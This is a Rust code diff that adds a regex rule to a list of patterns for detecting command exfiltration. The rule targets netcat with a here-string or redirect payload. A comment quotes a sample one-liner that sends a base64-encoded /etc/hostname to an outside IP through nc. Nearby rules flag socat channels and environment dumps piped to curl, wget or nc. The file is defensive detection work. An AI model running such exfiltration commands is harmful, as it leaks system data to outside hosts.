@@ -710,6 +710,16 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 .expect("Invalid regex"),
                 "socat exfiltration channel",
             ),
+            // nc with an stdin payload (wave-58: \`nc -w1 1.1.1.1 80
+            // <<< 'GET /$(base64 < /etc/hostname) HTTP/1.0'\`) — the
+            // pipe-anchored pattern needs a pipe BEFORE nc; a
+            // here-string/here-doc/redirect payload is the same channel.
+            // Plain \`nc -zv host port\` port checks have no payload
+            // redirect and pass.
+            (
+                Regex::new(r"\bnc\s+(-[\w]+\s+)*[\w.-]+\s+[0-9]{2,5}\b\s*(<<<|<<|<\s)").expect("Invalid regex"),
+                "netcat with stdin payload (exfiltration channel)",
+            ),
             (
                 Regex::new(r"\b(getent|printenv)\b[^|\n]*\|[^|\n]*(curl|wget|nc)\b")
                     .expect("Invalid regex"),
